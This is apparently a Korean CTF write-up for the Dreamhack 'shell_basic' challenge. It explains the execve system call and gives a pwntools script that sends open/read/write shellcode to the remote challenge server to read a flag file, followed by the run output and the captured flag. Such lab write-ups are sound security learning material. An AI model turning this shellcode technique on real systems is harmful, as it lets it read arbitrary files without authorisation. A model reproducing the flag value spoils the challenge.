## shell_basic
> 문제 URL: https://dreamhack.io/wargame/challenges/410  
> 입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다. main 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다. flag 파일의 위치와 이름은 `/home/shell_basic/flag_name_is_loooooong`입니다.

### **execve 시스템 콜**

`execve`는 새로운 프로그램을 실행하는 시스템 호출입니다. 이 호출은 현재 프로세스의 주소 공간을 새로운 프로그램으로 교체하여 실행합니다. 이를 통해, 현재 실행 중인 프로세스는 종료되지 않고 새로운 프로그램을 실행합니다.

#### **함수 시그니처:**
```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

- `pathname`: 실행할 프로그램의 경로를 지정하는 문자열입니다.
- `argv`: 프로그램에 전달할 인자 배열입니다. `argv[0]`은 일반적으로 프로그램의 이름이 됩니다.
- `envp`: 프로그램에 전달할 환경 변수 배열입니다.

#### **동작 원리:**
- `execve`를 호출하면, 현재 프로세스의 메모리 공간(코드, 데이터, 힙 등)은 새로운 프로그램으로 교체됩니다.
- 호출이 성공하면, 새로운 프로그램이 실행되며, 그 후의 코드(즉, `execve` 호출 이후의 코드는 실행되지 않습니다).
- 호출이 실패하면, -1을 반환하고 `errno`에 오류 코드가 설정됩니다.

#### **예시 코드:**
```c
#include <unistd.h>

int main() {
    char *argv[] = {"/bin/ls", "-l", NULL};  // 실행할 프로그램과 인자
    char *envp[] = {NULL};  // 환경 변수

    // /bin/ls 프로그램을 실행
    execve("/bin/ls", argv, envp);

    // execve 호출이 성공하면 이 아래 코드는 실행되지 않음
    return 0;
}
```

### Solve 😈
```python
from pwn import *

# 원격 서버에 연결
remote_host = "host1.dreamhack.games"
remote_port = 17445
p = remote(remote_host, remote_port)

# 아키텍처를 64비트로 설정 (uname -m 입력 시 x86_64인 경우)
context.arch = "amd64"

# 읽고 싶은 파일 경로
file_path = "/home/shell_basic/flag_name_is_loooooong"

# 쉘코드 생성
# 파일 열기
shellcode = shellcraft.open(file_path)

# 파일을 읽어오는 부분 (파일 디스크립터는 rax에 저장)
# 파일에서 0x30 바이트를 읽어서 rsp에 저장
shellcode += shellcraft.read('rax', 'rsp', 0x30)

# 읽은 내용을 표준 출력(stdout)에 출력
shellcode += shellcraft.write(1, 'rsp', 0x30)

# 쉘코드를 어셈블리 코드로 변환
compiled_shellcode = asm(shellcode)

# 생성된 쉘코드를 payload로 설정
payload = compiled_shellcode

# 원격 서버로 쉘코드를 전송
p.sendlineafter("shellcode: ", payload)

# 서버가 출력하는 데이터를 읽어서 출력 (최대 48바이트)
flag_data = p.recv(0x30)
print(flag_data)

```

```bash
┌──(root💀kali)-[~/dreamhack/shell_basic]
└─# python3 ./shell_basic.py                                                                                       1 ⚙
[+] Opening connection to host1.dreamhack.games on port 17445: Done
/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
b'DH{ca562d7cf1db6c55cb11c4ec350a3c0b}\nong\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Closed connection to host1.dreamhack.games port 17445
```